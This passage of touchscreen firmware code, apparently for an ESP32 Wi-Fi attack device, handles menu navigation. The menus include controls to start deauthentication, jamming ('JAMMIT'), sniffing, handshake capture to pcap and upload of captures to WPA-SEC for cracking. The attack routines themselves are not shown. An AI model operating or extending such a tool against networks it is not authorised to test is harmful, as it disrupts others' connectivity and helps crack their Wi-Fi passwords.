  if (screen == ScreenId::TARGET_DETAILS) {
    // Background tick for RAW logging
    rawCaptureTick();

    if (hit(btnTargetBack, tx, ty)) {
      setScreen(ScreenId::HOME);
      autoMode = AutoMode::NONE;
      if (sniffActive) stopSniff();
      resetTouchLatch();
      return;
    }

    if (hit(btnTargetAutomate, tx, ty)) {
      setScreen(ScreenId::AUTOMATE_MENU);
      resetTouchLatch();
      return;
    }

    if (hit(btnTargetMonitor, tx, ty)) {
      monitorReturnScreen = ScreenId::TARGET_DETAILS;
      setScreen(ScreenId::MONITOR);
      resetTouchLatch();
      return;
    }

    if (hit(btnTargetLock, tx, ty)) {
      lockChannel = !lockChannel;
      if (lockChannel && hasTarget) {
        applyChannelLockIfNeeded();
        Serial.printf("[ops] channel locked to %d\n", target.channel);
      } else {
        Serial.println("[ops] channel unlocked");
      }
      drawTargetDetails();
      resetTouchLatch();
      return;
    }

    if (hit(btnTargetSniff, tx, ty)) {
      if (!sniffActive) {
        if (!hasTarget) {
          Serial.println("[ops] SNIFF: no target selected");
        } else {
          if (!confirmWebRiskAction(RiskyWebAction::START_SNIFF, "Start SNIFF")) {
            waitTouchRelease();
            return;
          }
          startSniff();
          Serial.println("[ops] SNIFF started");
        }
      } else {
        stopSniff();
        Serial.println("[ops] SNIFF stopped");
      }
      drawTargetDetails();
      resetTouchLatch();
      return;
    }

    waitTouchRelease();
    return;
  }

// ABOUT / placeholders: Back only
  if (screen == ScreenId::ABOUT || screen == ScreenId::TARGETS_PLACEHOLDER) {
    if (hit(btnBack, tx, ty)) setScreen(ScreenId::HOME);
    waitTouchRelease(); return;
  }

  // BRUCE_MENU
  if (screen == ScreenId::BRUCE_MENU) {
    bruceMenuTick_UI(tx, ty);
    return;
  }

  // BRUCE_SET_TARGET
  if (screen == ScreenId::BRUCE_SET_TARGET) {
    bruceSetTargetTick_UI(tx, ty);
    return;
  }

  // BRUCE_MONITOR
  if (screen == ScreenId::BRUCE_MONITOR) {
    if (hit(btnBruceMonBack, tx, ty)) {
      if (bruceIsAttacking()) {
        Serial.println("[BRUCE_MON] STOP pressed - stopping attack");
        bruceStopAttack();
        bruceCloseCaptures();
        // Stay on monitor screen so user can see the final summary
        bruceMonLastUpdateMs = 0;  // force immediate redraw
      } else {
        Serial.println("[BRUCE_MON] BACK pressed - returning to menu");
        setScreen(ScreenId::BRUCE_MENU);
      }
      waitTouchRelease();
      return;
    }
    if (hit(btnBruceMonFiles, tx, ty)) {
      Serial.println("[BRUCE_MON] FILES button pressed");
      monitorPushLine(TFT_CYAN,  "-- FILES --");
      if (brucePcapPath[0])
        monitorPushLine(TFT_WHITE, "%.60s", brucePcapPath);
      else
        monitorPushLine(0x7BCF, "(no pcap – SD unavail)");
      if (bruceSessionLogPath[0])
        monitorPushLine(TFT_WHITE, "%.60s", bruceSessionLogPath);
      else
        monitorPushLine(0x7BCF, "(no log  – SD unavail)");
      drawBruceMonitorTerminal();
      waitTouchRelease();
      return;
    }
    waitTouchRelease();
    return;
  }

  // MONITOR
  if (screen == ScreenId::MONITOR) {
    if (hit(btnMonitorBack, tx, ty)) {
      setScreen(monitorReturnScreen);
      waitTouchRelease();
      return;
    }
    if (hit(btnMonitorTab1, tx, ty)) {
      monitorMode = MonitorMode::LIVE;
      monitorLastUpdateMs = 0;
      drawMonitor();
      waitTouchRelease();
      return;
    }
    if (hit(btnMonitorTab2, tx, ty)) {
      monitorMode = MonitorMode::FILES;
      if (monitorFilePath[0] == '\0') strcpy(monitorFilePath, "/");
      monitorLoadFileDir(monitorFilePath);
      monitorLastUpdateMs = 0;
      drawMonitor();
      waitTouchRelease();
      return;
    }

    if (monitorMode == MonitorMode::FILES) {
      if (hit(btnMonitorUpDir, tx, ty)) {
        monitorGoParentDir();
        drawMonitor();
        waitTouchRelease();
        return;
      }
      if (hit(btnMonitorUp, tx, ty)) {
        int maxScroll = monitorFileCount - monitorFileVisibleRows;
        if (maxScroll < 0) maxScroll = 0;
        monitorFileScroll = clampi(monitorFileScroll - 1, 0, maxScroll);
        drawMonitor();
        waitTouchRelease();
        return;
      }
      if (hit(btnMonitorDown, tx, ty)) {
        int maxScroll = monitorFileCount - monitorFileVisibleRows;
        if (maxScroll < 0) maxScroll = 0;
        monitorFileScroll = clampi(monitorFileScroll + 1, 0, maxScroll);
        drawMonitor();
        waitTouchRelease();
        return;
      }

      if (tx >= monitorFileListX && tx < (monitorFileListX + monitorFileListW) &&
          ty >= monitorFileListY && ty < (monitorFileListY + monitorFileListH)) {
        const int row = (ty - monitorFileListY) / monitorFileRowH;
        const int idx = monitorFileScroll + row;
        if (idx >= 0 && idx < monitorFileCount) {
          const MonitorFileEntry& e = monitorFiles[idx];
          if (e.isDir) {
            monitorEnterDir(e.name);
            drawMonitor();
          } else {
            char fullPath[128];
            if (strcmp(monitorFilePath, "/") == 0) {
              snprintf(fullPath, sizeof(fullPath), "/%s", e.name);
            } else {
              snprintf(fullPath, sizeof(fullPath), "%s/%s", monitorFilePath, e.name);
            }
            char info[80];
            snprintf(info, sizeof(info), "%s (%lu B)", e.name, (unsigned long)e.size);
            monitorSetFileInfo(info);
            Serial.printf("[logs] selected file: %s\n", fullPath);
            drawMonitor();
          }
          waitTouchRelease();
          return;
        }
      }
    }
    waitTouchRelease();
    return;
  }

  // RECON
  if (screen == ScreenId::RECON) {
    if (hit(btnReconBack, tx, ty)) {
      if (reconActive) {
        DeauthHunter::stop();
        reconActive = false;
      }
      setScreen(ScreenId::HOME);
      waitTouchRelease();
      return;
    }
    if (hit(btnReconStart, tx, ty)) {
      reconActive = !reconActive;
      if (reconActive) {
        DeauthHunter::start();
      } else {
        DeauthHunter::stop();
      }
      drawRecon();  // Partial redraw: stats + controls only
      waitTouchRelease();
      return;
    }
    if (hit(btnReconClear, tx, ty)) {
      DeauthHunter::reset();
      reconLastLogCount = 0;
      reconLastTotalEvents = 0;
      reconLastDrawChannel = DeauthHunter::getCurrentChannel();
      clearReconConsoleArea();
      drawRecon();
      waitTouchRelease();
      return;
    }
    waitTouchRelease();
    return;
  }

  // AUTOMATE MENU (Scrollable mode selection with touch buttons)
  if (screen == ScreenId::AUTOMATE_MENU) {
    rawCaptureTick();

    if (hit(btnAutoBack, tx, ty)) {
      setScreen(ScreenId::TARGET_DETAILS);
      resetTouchLatch();
      return;
    }

    if (hit(btnAutoY0INK, tx, ty)) {
      if (!confirmWebRiskAction(RiskyWebAction::AUTO_Y0INK, "Engage Y0INK")) { waitTouchRelease(); return; }
      engageAutoMode(AutoMode::Y0INK); setScreen(ScreenId::TARGET_DETAILS); resetTouchLatch(); return;
    }
    if (hit(btnAutoRAW, tx, ty)) {
      if (!confirmWebRiskAction(RiskyWebAction::AUTO_RAW, "Engage RAW")) { waitTouchRelease(); return; }
      engageAutoMode(AutoMode::RAW); setScreen(ScreenId::TARGET_DETAILS); resetTouchLatch(); return;
    }
    if (hit(btnAutoSCOPE, tx, ty)) {
      if (!confirmWebRiskAction(RiskyWebAction::AUTO_SCOPE, "Engage SCOPE")) { waitTouchRelease(); return; }
      engageAutoMode(AutoMode::SCOPE); setScreen(ScreenId::SCOPE_GRAPH); resetTouchLatch(); return;
    }
    if (hit(btnAutoJAMMIT, tx, ty)) {
      if (!confirmWebRiskAction(RiskyWebAction::AUTO_JAMMIT, "Engage JAMMIT")) { waitTouchRelease(); return; }
      engageAutoMode(AutoMode::JAMMIT); setScreen(ScreenId::TARGET_DETAILS); resetTouchLatch(); return;
    }

    waitTouchRelease();
    return;
  }

// CONFIG menu
  if (screen == ScreenId::CONFIG) {
    if (hit(btnBack, tx, ty)) { setScreen(ScreenId::HOME); waitTouchRelease(); return; }
    if (hit(btnCfgWifi, tx, ty)) { setScreen(ScreenId::WIFI_CONFIG); waitTouchRelease(); return; }
    if (hit(btnCfgWifiConnect, tx, ty)) { 
      // Open WiFi Connect without auto-scan; scan is manual via Scan button.
      wifiConnectStatus = "Press Scan to find networks";
      wifiConnectSelectedIdx = -1;
      wifiConnectScroll = 0;
      Serial.println("[cfg] Opening WiFi Connect (manual scan)");
      setScreen(ScreenId::WIFI_CONNECT); 
      drawWifiConnect();
      waitTouchRelease();
      return; 
    }
    if (hit(btnCfgWebserver, tx, ty)) { 
      Serial.println("[cfg] Switching to Webserver screen");
      setScreen(ScreenId::WEBSERVER); 
      drawWebserver();
      waitTouchRelease();
      return; 
    }
    if (hit(btnCfgStartup, tx, ty)) {
      setScreen(ScreenId::STARTUP_CONFIG);
      waitTouchRelease();
      return;
    }
    if (hit(btnCfgTelemetry, tx, ty)) {
      setScreen(ScreenId::TELEMETRY_CONFIG);
      waitTouchRelease();
      return;
    }
    if (hit(btnCfgLed, tx, ty)) { 
      Serial.println("[cfg] Opening LED Control");
      setScreen(ScreenId::LED_CONTROL); 
      waitTouchRelease();
      return; 
    }
    waitTouchRelease();
    return;
  }

  // WIFI_CONFIG
  if (screen == ScreenId::WIFI_CONFIG) {
    bool changed = false;

    if (hit(btnBack, tx, ty)) { setScreen(ScreenId::CONFIG); waitTouchRelease(); return; }

    if (hit(btnSave, tx, ty)) {
      if (saveConfig(cfg)) {
        configDirty = false;
        Serial.println("[cfg] save via UI");
        printConfigSerial(cfg);
      }
      drawWifiConfig();
      waitTouchRelease();
      return;
    }

    if (hit(btnHopMinus, tx, ty)) { bumpInt(cfg.wifi_channelHopInterval, -50, 100, 5000); changed = true; }
    if (hit(btnHopPlus,  tx, ty)) { bumpInt(cfg.wifi_channelHopInterval, +50, 100, 5000); changed = true; }

    if (hit(btnScanMinus, tx, ty)) { bumpInt(cfg.wifi_scanDuration, -250, 250, 15000); changed = true; }
    if (hit(btnScanPlus,  tx, ty)) { bumpInt(cfg.wifi_scanDuration, +250, 250, 15000); changed = true; }

    if (hit(btnDeauthToggle, tx, ty)) { cfg.wifi_enableDeauth = !cfg.wifi_enableDeauth; changed = true; }
    if (hit(btnWifiDefaultLockToggle, tx, ty)) { cfg.wifi_defaultLockChannel = !cfg.wifi_defaultLockChannel; changed = true; }

    if (changed) {
      configDirty = true;
      Serial.println("[cfg] changed via UI (dirty)");
      drawWifiConfig();
    }

    waitTouchRelease();
    return;
  }

  // STARTUP_CONFIG
  if (screen == ScreenId::STARTUP_CONFIG) {
    if (hit(btnBack, tx, ty)) { setScreen(ScreenId::CONFIG); waitTouchRelease(); return; }

    if (hit(btnStartupAutoReconnect, tx, ty)) {
      cfg.startup_autoReconnectPrompt = !cfg.startup_autoReconnectPrompt;
      saveConfig(cfg);
      drawStartupConfig();
      waitTouchRelease();
      return;
    }

    if (hit(btnStartupDefaultLockToggle, tx, ty)) {
      cfg.wifi_defaultLockChannel = !cfg.wifi_defaultLockChannel;
      saveConfig(cfg);
      drawStartupConfig();
      waitTouchRelease();
      return;
    }

    waitTouchRelease();
    return;
  }

  // TELEMETRY_CONFIG
  if (screen == ScreenId::TELEMETRY_CONFIG) {
    if (hit(btnBack, tx, ty)) { setScreen(ScreenId::CONFIG); waitTouchRelease(); return; }

    bool changed = false;
    if (hit(btnTelemetryMinus, tx, ty)) {
      bumpInt(cfg.telemetry_monitorIntervalMs, -100, 200, 2000);
      changed = true;
    }
    if (hit(btnTelemetryPlus, tx, ty)) {
      bumpInt(cfg.telemetry_monitorIntervalMs, 100, 200, 2000);
      changed = true;
    }
    if (hit(btnTelemetryVerboseToggle, tx, ty)) {
      cfg.telemetry_verboseSerial = !cfg.telemetry_verboseSerial;
      verboseSerial = cfg.telemetry_verboseSerial;
      changed = true;
    }

    if (changed) {
      saveConfig(cfg);
      monitorLastUpdateMs = 0;
      drawTelemetryConfig();
      waitTouchRelease();
      return;
    }

    waitTouchRelease();
    return;
  }

  // SCOPE_GRAPH
  if (screen == ScreenId::SCOPE_GRAPH) {
    if (hit(btnScopeBack, tx, ty)) {
      setScreen(ScreenId::AUTOMATE_MENU);
      waitTouchRelease();
      return;
    }
    if (hit(btnScopeRefresh, tx, ty)) {
      doWifiScanBlocking();
      scopePushWaterfallFrame();
      scopeLastScanMs = millis();
      drawScopeGraph();
      waitTouchRelease();
      return;
    }
    waitTouchRelease();
    return;
  }

  // LED_CONTROL
  if (screen == ScreenId::LED_CONTROL) {
    if (hit(btnBack, tx, ty)) { setScreen(ScreenId::CONFIG); waitTouchRelease(); return; }

    ledSliderDraggingHue = ledPointInSlider(tx, ty, LED_HUE_Y);
    ledSliderDraggingBrightness = !ledSliderDraggingHue && ledPointInSlider(tx, ty, LED_BRIGHTNESS_Y);
    if (!ledSliderDraggingHue && !ledSliderDraggingBrightness) {
      waitTouchRelease();
      return;
    }

    bool changed = false;
    if (ledSliderDraggingHue) {
      changed = ledSetHueFromTouchX(tx);
    } else if (ledSliderDraggingBrightness) {
      changed = ledSetBrightnessFromTouchX(tx);
    }
    if (changed) {
      applyStatusLedState(ledBrightness, ledRed, ledGreen, ledBlue);
      drawLedControlDynamic();
    }

    // Drag handling: keep updating slider while finger is down.
    while (true) {
      TouchState s = readTouch();
      if (!s.down) break;

      bool stepChanged = false;
      if (ledSliderDraggingHue) {
        stepChanged = ledSetHueFromTouchX(s.x);
      } else if (ledSliderDraggingBrightness) {
        stepChanged = ledSetBrightnessFromTouchX(s.x);
      }

      if (stepChanged) {
        applyStatusLedState(ledBrightness, ledRed, ledGreen, ledBlue);
        drawLedControlDynamic();
      }
      delay(8);
    }

    ledSliderDraggingHue = false;
    ledSliderDraggingBrightness = false;
    waitTouchRelease();
    return;
  }

  // WIFI_CONNECT
  if (screen == ScreenId::WIFI_CONNECT) {
    if (wifiConnectShowPasswordModal) {
      for (int i = 0; i < wifiPwKeyCount; i++) {
        if (hit(btnWifiPwKeys[i], tx, ty)) {
          if (wifiConnectPassword.length() < 63) {
            wifiConnectPassword += wifiPwKeyValues[i];
          }
          if (wifiPwShift) wifiPwShift = false;
          drawWifiConnect();
          waitTouchRelease();
          return;
        }
      }
      if (hit(btnWifiPwShift, tx, ty)) {
        wifiPwShift = !wifiPwShift;
        drawWifiConnect();
        waitTouchRelease();
        return;
      }
      if (hit(btnWifiPwBack, tx, ty)) {
        if (!wifiConnectPassword.isEmpty()) wifiConnectPassword.remove(wifiConnectPassword.length() - 1);
        drawWifiConnect();
        waitTouchRelease();
        return;
      }
      if (hit(btnWifiPwClear, tx, ty)) {
        wifiConnectPassword = "";
        drawWifiConnect();
        waitTouchRelease();
        return;
      }
      if (hit(btnWifiPwSpace, tx, ty)) {
        if (wifiConnectPassword.length() < 63) wifiConnectPassword += " ";
        drawWifiConnect();
        waitTouchRelease();
        return;
      }
      if (hit(btnWifiPwCancel, tx, ty)) {
        wifiConnectShowPasswordModal = false;
        wifiConnectStatus = "Password entry canceled";
        drawWifiConnect();
        waitTouchRelease();
        return;
      }
      if (hit(btnWifiPwConnect, tx, ty)) {
        if (wifiConnectSelectedIdx < 0 || wifiConnectSelectedIdx >= apCount) {
          wifiConnectShowPasswordModal = false;
          wifiConnectStatus = "Select a network first";
          drawWifiConnect();
          waitTouchRelease();
          return;
        }
        if (wifiConnectPassword.isEmpty()) {
          wifiConnectStatus = "Password cannot be empty";
          drawWifiConnect();
          waitTouchRelease();
          return;
        }
        const ApRecord& selectedAp = aps[wifiConnectSelectedIdx];
        wifiConnectShowPasswordModal = false;
        connectToWifi(selectedAp.ssid, wifiConnectPassword);
        drawWifiConnect();
        waitTouchRelease();
        return;
      }

      waitTouchRelease();
      return;
    }

    // Back button
    if (hit(btnWifiConnectBack, tx, ty)) {
      Serial.println("[ui] Returning to CONFIG from WIFI_CONNECT");
      setScreen(ScreenId::CONFIG);
      waitTouchRelease();
      return;
    }

    // Scan button
    if (hit(btnWifiConnectScan, tx, ty)) {
      Serial.println("[wifi] User initiated WiFi scan from WIFI_CONNECT screen");
      wifiConnectStatus = "Scanning networks...";
      wifiConnectSelectedIdx = -1;
      wifiConnectScroll = 0;
      wifiConnectScanActive = startWifiScanAsync();
      wifiConnectScanStartedMs = millis();
      if (!wifiConnectScanActive) {
        wifiConnectStatus = "Scan start failed";
      }
      drawWifiConnect();
      waitTouchRelease();
      return;
    }

    // Connect button
    if (hit(btnWifiConnectSubmit, tx, ty)) {
      if (wifiConnectScanActive) {
        wifiConnectStatus = "Wait for scan to finish";
        drawWifiConnect();
        waitTouchRelease();
        return;
      }
      if (wifiConnectSelectedIdx >= 0) {
        const ApRecord& selectedAp = aps[wifiConnectSelectedIdx];
        // Open networks connect immediately.
        if (selectedAp.auth == WIFI_AUTH_OPEN) {
          Serial.println("[wifi] Open network detected, connecting without password");
          connectToWifi(selectedAp.ssid, "");
        } else {
          // Secured network: show password modal (prefill saved password if SSID matches).
          wifiConnectPassword = (cfg.wifi_ssid == selectedAp.ssid) ? cfg.wifi_password : "";
          wifiPwShift = false;
          wifiConnectShowPasswordModal = true;
          wifiConnectStatus = "Enter password for: " + selectedAp.ssid;
          Serial.printf("[wifi] Password prompt opened for '%s'\n", selectedAp.ssid.c_str());
        }
        drawWifiConnect();
      } else {
        wifiConnectStatus = "Select a network first";
        Serial.println("[wifi] Connect attempt: no network selected");
        drawWifiConnect();
      }
      waitTouchRelease();
      return;
    }

    // Disconnect button
    if (hit(btnWifiConnectDisconnect, tx, ty)) {
      wifiConnectInProgress = false;
      WiFi.disconnect(false, false);
      wifiConnectStatus = "Disconnected";
      Serial.println("[wifi] User disconnected from current network");
      drawWifiConnect();
      waitTouchRelease();
      return;
    }

    // Scroll up button
    if (hit(btnWifiConnectUp, tx, ty)) {
      if (wifiConnectScroll > 0) {
        wifiConnectScroll--;
        Serial.printf("[ui] WiFi list scrolled up to position %d\n", wifiConnectScroll);
        drawWifiConnect();
      }
      waitTouchRelease();
      return;
    }

    // Scroll down button
    if (hit(btnWifiConnectDown, tx, ty)) {
      if ((wifiConnectScroll + 3) < apCount) {
        wifiConnectScroll++;
        Serial.printf("[ui] WiFi list scrolled down to position %d\n", wifiConnectScroll);
        drawWifiConnect();
      }
      waitTouchRelease();
      return;
    }

    // AP list selection (3 visible rows)
    if (wifiConnectScanActive) {
      waitTouchRelease();
      return;
    }
    for (int i = 0; i < 3 && (wifiConnectScroll + i) < apCount; i++) {
      if (hit(btnWifiConnectList[i], tx, ty)) {
        wifiConnectSelectedIdx = wifiConnectScroll + i;
        wifiConnectSsid = aps[wifiConnectSelectedIdx].ssid.isEmpty() ? "(hidden)" : aps[wifiConnectSelectedIdx].ssid;
        wifiConnectNeedsPassword = (aps[wifiConnectSelectedIdx].auth != WIFI_AUTH_OPEN);
        Serial.printf("[wifi] Selected: '%s' (Channel %d, Auth: %s, RSSI: %ddBm)\n", 
                      wifiConnectSsid.c_str(),
                      aps[wifiConnectSelectedIdx].channel,
                      authToStr(aps[wifiConnectSelectedIdx].auth),
                      aps[wifiConnectSelectedIdx].rssi);
        drawWifiConnect();
        waitTouchRelease();
        return;
      }
    }

    waitTouchRelease();
    return;
  }

  // WEBSERVER
  if (screen == ScreenId::WEBSERVER) {
    // Back button
    if (hit(btnWebserverBack, tx, ty)) {
      Serial.println("[ui] Returning to CONFIG from WEBSERVER");
      setScreen(ScreenId::CONFIG);
      waitTouchRelease();
      return;
    }

    // Start/Stop AP button
    if (hit(btnWebserverStartAP, tx, ty)) {
      startAPMode();
      Serial.printf("[ap] AP mode toggled: %s\n", apMode ? "ON" : "OFF");
      drawWebserver();
      waitTouchRelease();
      return;
    }

    // WebServer toggle button
    if (hit(btnWebserverStartServer, tx, ty)) {
      if (webServerRunning) stopWebServer();
      else startWebServer();
      Serial.printf("[web] WebServer state: %s\n", webServerRunning ? "ON" : "OFF");
      drawWebserver();
      waitTouchRelease();
      return;
    }

    // WPA-SEC Sync button
    if (hit(btnWebserverWpaSecSync, tx, ty)) {
      Serial.println("[ui] User pressed WPA-SEC Sync button");
      syncWithWPASec();
      drawWebserver();
      waitTouchRelease();
      return;
    }

    // WPA-SEC Download Results button
    if (hit(btnWebserverDownloadResults, tx, ty)) {
      Serial.println("[ui] User pressed Download Results button");
      downloadWPASecResults();
      drawWebserver();
      waitTouchRelease();
      return;
    }

    waitTouchRelease();
    return;
  }


}

